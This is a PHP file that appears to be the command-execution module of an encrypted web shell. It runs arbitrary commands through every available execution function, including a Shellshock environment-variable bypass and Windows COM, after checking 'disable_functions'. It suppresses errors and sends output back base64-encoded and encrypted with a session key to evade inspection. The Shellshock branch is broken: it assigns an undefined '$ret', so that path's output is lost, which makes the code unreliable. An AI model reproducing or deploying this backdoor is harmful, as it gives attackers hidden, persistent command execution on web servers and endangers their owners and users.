@error_reporting(0);

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function fe($f)
{
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));
};
function runshellshock($d, $c)
{
    if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
        if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
            $tmp = tempnam(sys_get_temp_dir(), 'as');
            putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
            if (fe('error_log')) {
                error_log("a", 1);
            } else {
                mail("a@127.0.0.1", "", "", "-bv");
            }
        } else {
            return False;
        }
        $output = @file_get_contents($tmp);
        @unlink($tmp);
        if ($output != "") {
            return $output;
        }
    }
    return "";
}
function main($cmd,$path)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);

    $result = array();
    $c = $cmd;
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        $c = $c . " 2>&1\n";
    }
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);

    $kWJW = NULL;
    if (fe('system')) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if (fe('proc_open')) {
        $handle = proc_open($c, array(
            array('pipe', 'r'),
            array('pipe', 'w'),
            array('pipe', 'w')
        ), $pipes);
        while (!feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if (fe('passthru')) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if (fe('shell_exec')) {
        $kWJW = shell_exec($c);
    } else if (fe('exec')) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if (fe('popen')) {
        $fp = popen($c, 'r');
        if (is_resource($fp)) {
            while (!feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else if (runshellshock($d, $c) != "") {
        // Assuming $ret is defined and contains the result of runshellshock
        $kWJW = "$ret";
    } else if (substr($d, 0, 1) != "/" && @class_exists("COM")) {
        $w = new COM('WScript.shell');
        $e = $w->exec($c);
        $so = $e->StdOut();
        $kWJW .= $so->ReadAll();
        $se = $e->StdErr();
        $kWJW .= $se->ReadAll();
    } else {
        $kWJW = 0;
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode("none of system/proc_open/passthru/shell_exec/exec/popen/runshellshock/WScript is available");
        $key = $_SESSION['k'];
        echo encrypt(json_encode($result), $key);
        return;
    }
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(getSafeStr($kWJW));
    echo encrypt(json_encode($result),  $_SESSION['k']);
}